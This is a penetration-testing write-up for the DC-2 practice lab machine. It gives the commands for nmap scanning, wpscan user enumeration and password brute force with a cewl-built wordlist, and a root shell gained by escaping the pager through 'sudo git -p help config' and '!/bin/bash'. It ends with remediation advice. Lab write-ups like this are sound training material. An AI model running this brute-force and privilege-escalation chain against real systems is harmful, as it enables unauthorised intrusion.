# Penetration Testing Report – DC-2

## Target Information

| Field | Details |
|---|---|
| Machine Description | A deliberately vulnerable lab machine for practicing web application exploits, privilege escalation, and post-exploitation techniques. |
| Target IP | `192.168.0.131` |
| Vulnerability Name | WordPress Weak Credentials, Git Access Misconfiguration, Privilege Escalation |
| Port / Service | `80/http`, `7744/ssh` |
| Severity | High (8.1) |
| Attack Vector | `CVSS:3.0/AV:L/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H` |

---

# Proof of Concept (PoC)

## Step 1 – Discover Target IP

```bash
nmap -sn 192.168.0.0/24
```

![Step 1](images/step1.png)

---

## Step 2 – Scan Open Ports and Services

```bash
nmap -p- -sC -sV 192.168.0.131 --open
```

![Step 2](images/step2.png)

---

## Step 3 – Enumerate WordPress Users

Using WPScan, multiple valid users were identified.

```bash
wpscan --url http://192.168.0.131 --disable-tls-checks --enumerate p --enumerate t --enumerate u
```

![Step 3](images/step3.png)

---

## Step 4 – Create Custom Wordlist

A custom password list was generated using words gathered from the target website.

```bash
cewl http://192.168.0.131 -w cewl.txt
```

![Step 4](images/step4.png)

---

## Step 5 – Brute Force WordPress Credentials

Weak credentials were identified using WPScan brute force.

```bash
wpscan --url http://192.168.0.131 --disable-tls-checks -U users -P ./cewl.txt
```

![Step 5](images/step5.png)

---

## Step 6 – Login as Valid User

Authenticated access was achieved using discovered credentials.

![Step 6](images/step6.png)

---

## Step 7 – Lateral Movement to User `jerry`

Further enumeration revealed access to the `git` service without a password requirement.

![Step 7](images/step7.png)

---

## Step 8 – Privilege Escalation via Pagination Abuse

Pagination functionality was abused by overflowing the terminal page and executing commands.

Example:

```bash
sudo git -p help config
```

![Step 8](images/step8.png)

---

## Step 9 – Spawn Root Shell

A root shell was obtained using:

```bash
!/bin/bash
```

![Step 9](images/step9.png)

---

# Remediation

- Use strong and unique passwords for all WordPress accounts.
- Enforce password policies and MFA.
- Disable or secure unnecessary Git access.
- Keep WordPress core, themes, and plugins updated.
- Apply least-privilege access controls.
- Regularly audit services and user permissions.

---

# Impact

- Weak passwords allow attackers to gain valid user access.
- Brute force attacks can compromise administrative accounts.
- Misconfigured Git access enables lateral movement.
- Privilege escalation flaws can lead to root compromise.
- Full server compromise may result in:
  - data theft
  - website defacement
  - persistent backdoors
  - attacks against internal systems

---

# References

- https://wordpress.org/support/article/password-best-practices/
- https://www.kaspersky.com/resource-center/definitions/brute-force-attack
- https://www.techtarget.com/searchsecurity/definition/principle-of-least-privilege-POLP
- https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/privilege-escalation/
